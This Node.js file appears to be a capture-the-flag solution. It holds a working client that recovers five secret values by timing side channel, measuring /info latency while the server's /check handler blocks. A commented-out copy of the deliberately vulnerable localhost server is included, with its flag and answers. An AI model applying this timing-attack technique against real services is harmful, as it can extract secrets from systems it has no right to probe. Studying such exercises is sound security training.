#!/usr/bin/env node
// run with: node sequencehunt_server.js
// info page: http://localhost:8080/info
// correct values: http://localhost:8080/check?val0=4&val1=12&val2=77&val3=98&val4=35

// Write a Node.js client that can exploit the timing attack vulnerability in the server code below.

async function checkValuesAndTiming(values) {
  const queryParts = new Array(values.length);

  for (let i = 0; i < values.length; i++)
    queryParts[i] = `val${i}=${Math.round(values[i])}`;

  const checkURL = `http://localhost:8080/check?${queryParts.join("&")}`;
  const infoURL = "http://localhost:8080/info";

  let startTime = 0;
  let checkResponseTime = 0;
  let infoResponseTime = 0;

  startTime = performance.now();

  const checkRequest = fetch(checkURL);
  const infoRequest = fetch(infoURL);

  checkRequest.finally(() => (checkResponseTime = performance.now() - startTime));
  infoRequest.finally(() => (infoResponseTime = performance.now() - startTime));

  await Promise.all([checkRequest, infoRequest]);

  const checkResponse = await checkRequest;

  return {
    checkResponse,
    checkResponseTime: checkResponseTime,
    infoResponseTime: infoResponseTime,
  };
}

let solved = false;
let currentValues = Array(5);
let currentIndex = 0;

let currentInfoResponseTimes = [];
let currentInfoValues = [];
let totalAverageInfoResponseTimes = 0;

const TimeDifferenceThreshold = 0.05; // seconds

while (!solved) {
  currentValues[currentIndex] = (currentValues[currentIndex] ?? -1) + 1;

  for (let i = currentIndex + 1; i < currentValues.length; i++) currentValues[i] = -1;

  let currentAverageCheckResponseTime = 0;
  let currentAverageInfoResponseTime = 0;

  /** @type {Response} */
  let initialCheckResponse;

  for (let j = 0, n = 5; j < n; j++) {
    const { checkResponse, checkResponseTime, infoResponseTime } = await checkValuesAndTiming(currentValues);

    currentAverageCheckResponseTime += checkResponseTime / n;
    currentAverageInfoResponseTime += infoResponseTime / n;

    if (checkResponse.status === 500)
      throw new Error(await checkResponse.text());

    initialCheckResponse ??= checkResponse;
  }


  // const responseText = await initialCheckResponse.text();
  const responseCode = initialCheckResponse.status;

  currentInfoResponseTimes.push(currentAverageInfoResponseTime);
  totalAverageInfoResponseTimes += currentAverageInfoResponseTime;

  solved = responseCode === 200;

  // console.log('%o: %d / %d (%d)', currentValues, currentAverageCheckResponseTime.toFixed(2), currentAverageInfoResponseTime.toFixed(2), responseCode);
  console.log('%o: %d / %d (%d)', currentValues, currentAverageInfoResponseTime.toFixed(2), (totalAverageInfoResponseTimes / currentInfoResponseTimes.length).toFixed(2), responseCode);

  currentInfoValues.push([...currentValues]);

  if (!solved && currentInfoResponseTimes.length > 5) {
    const overallAverageInfoResponseTime =
      totalAverageInfoResponseTimes / currentInfoResponseTimes.length;

    for (let i = currentInfoResponseTimes.length - 5; i < currentInfoResponseTimes.length; i++) {
      const time = currentInfoResponseTimes[i];

      if (time - overallAverageInfoResponseTime >= 25) {
        console.log(`Possible timing attack detected with values: ${currentInfoValues[i].join(", ")} - Response time: ${time.toFixed(2)}s`);
        (currentValues = [...currentInfoValues[i]])[++currentIndex] = -1;
        currentInfoResponseTimes = [];
        currentInfoValues = [];
        totalAverageInfoResponseTimes = 0;
      };

    }
  }

  if (currentIndex >= currentValues.length) {
    throw new Error(`Reached the end of the search space with values: ${currentValues.join(", ")}`);
  }

}

// import http from 'http';
// import url from 'url';

// var TimingAttackProtectionSeconds = 3;

// var IOLoopCounter = 0;

// // even loop blocking sleep
// function sleep(s) {
//   var e = new Date().getTime() + s;
//   while (new Date().getTime() <= e) { ; }
// }

// // check input, simulates algorithm vulnerable to timing attack
// // for each correct value, additional delay of 0.45s is added.
// function checkInput(params) {
//   const correct = [4, 12, 77, 98, 35];

//   // params into array
//   const p = Object.keys(params).map(function (v) { return parseInt(params[v]); });

//   console.log('working hard on our input ' + JSON.stringify(params));

//   let result = true;
//   let sleepTime = 0.45;

//   console.log('DEBUG: Input values: ' + JSON.stringify(p));

//   if (p.length != correct.length) result = false;

//   for (let i = 0; i < p.length; i++) {
//     if (p[i] == correct[i]) {
//       sleepTime += 0.45;
//     } else {
//       result = false;
//     }
//   }

//   sleep(sleepTime * 1000);

//   return result;
// }

// http.createServer(
//   /**
//    * @param {import('http').ClientRequest} request
//    * @param {import('http').ServerResponse} response
//    * @returns
//    */
//   function (request, response) {
//     var u = url.parse(request.url, true);

//     if (u.path.indexOf('/info') == 0) {
//       IOLoopCounter++;
//       response.writeHeader(200, { 'Content-Type': 'text/html' });
//       response.write('IOLoop: ' + IOLoopCounter);
//       response.end();

//     } else if (u.path.indexOf('/check') == 0) {
//       IOLoopCounter++;
//       var start = new Date().getTime();
//       // check if the input valus are correct (algorithm is time sensitive to the input)
//       let result;

//       try {
//         result = checkInput(u.query);
//       } catch (e) {
//         console.error('Error while checking input: ' + e.message);
//         response.writeHead(500, { 'Content-Type': 'text/plain' });
//         // response.write(500, { 'Content-Type': 'text/plain' });
//         response.write('Internal Server Error');
//         response.end();
//         return;
//       }

//       var secondsSpent = ((new Date().getTime()) - start) / 1000.0;

//       // "prevent" the timing attack. wait until 3 seconds pass
//       var timeLeftToWait = TimingAttackProtectionSeconds - secondsSpent;

//       setTimeout(function () {
//         response.writeHeader(200, { 'Content-Type': 'text/html' });
//         if (result) {
//           response.write('Congratulations, here is your price:</br>32C3_round_and_round_and_round_IT_goes</br>');
//         } else {
//           response.write('At least one value is wrong!</br>');
//         }
//         response.end();
//         console.log('DEBUG: Blocked IO loop for: ' + secondsSpent.toFixed(2) + 's');
//         console.log('DEBUG: Total request time: ' + TimingAttackProtectionSeconds + 's');
//       }, timeLeftToWait * 1000);

//     }
//   }
// ).listen(8080);

// console.log('Server running at http://localhost:8080/');

// import http from 'http';
// import url from 'url';
// import { performance } from 'perf_hooks';
// import { createInterface } from 'readline';
// import { createSocket } from 'dgram';
// const rl = createInterface({
//   input: process.stdin,
//   output: process.stdout
// });
// const serverUrl = 'http://localhost:8080/check';
// const correctValues = [4, 12, 77, 98, 35];
// const timingAttackProtectionSeconds = 3;
// let foundValues = [];
// function askForInput() {
//   rl.question('Enter a value (or "exit" to quit): ', (input) => {
//     if (input.toLowerCase() === 'exit') {
//       rl.close();
//       return;
//     }

//     const value = parseInt(input, 10);
//     if (isNaN(value)) {
//       console.log('Please enter a valid number.');
//       askForInput();
//       return;
//     }

//     foundValues.push(value);
//     checkValues();
//   });
// }
// function checkValues() {
//   if (foundValues.length < correctValues.length) {
//     console.log(`Current values: ${foundValues.join(', ')}`);
//     askForInput();
//     return;
//   }

//   const query = new URLSearchParams();
//   foundValues.forEach((val, index) => {
//     query.append(`val${index}`, val);
//   });

//   const requestUrl = `${serverUrl}?${query.toString()}`;
//   const startTime = performance.now();

//   http.get(requestUrl, (res) => {
//     res.on('data', (data) => {
//       console.log(`Response: ${data}`);
//     });

//     res.on('end', () => {
//       const endTime = performance.now();
//       const elapsedTime = (endTime - startTime) / 1000;
//       console.log(`Request completed in ${elapsedTime.toFixed(2)} seconds`);

//       if (elapsedTime >= timingAttackProtectionSeconds) {
//         console.log('Timing attack protection triggered.');
//       } else {
//         console.log('Values checked successfully.');
//       }

//       foundValues = [];
//       askForInput();
//     });
//   }).on('error', (err) => {
//     console.error(`Error: ${err.message}`);
//     askForInput();
//   });
// }
// function startClient() {
//   console.log('Starting client to exploit timing attack vulnerability...');
//   askForInput();
// }
// startClient();
// // To run this client, ensure the server is running on http://localhost:8080
